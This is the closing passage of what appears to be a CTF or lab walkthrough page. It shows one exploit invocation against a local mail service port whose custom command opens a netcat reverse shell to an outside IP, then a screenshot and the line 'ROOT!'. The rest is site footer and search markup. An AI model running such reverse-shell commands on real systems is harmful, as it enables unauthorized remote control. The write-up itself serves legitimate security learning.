</span></span><span class=line><span class=cl>python3 exploit.py --targetHost 127.0.0.1 --targetPort <span class=m>25</span> --customCommand <span class=s1>&#39;nc 10.10.11.150 1337 -e /bin/bash&#39;</span>
</span></span></code></pre></div><p><img src=/images/cupid23.png alt="Image Description"></p><p>ROOT!</p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2026 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script><div id=search-overlay><div class=search-container><input type=search id=search-input placeholder="Search writeups, notes, and more..." autocomplete=off aria-label=Search><div class=search-hint>Press <kbd>ESC</kbd> to close or <kbd>/</kbd> to open search</div><div id=search-results></div></div><button class=search-close onclick=hideSearch() aria-label="Close search">×</button></div></div></body></html>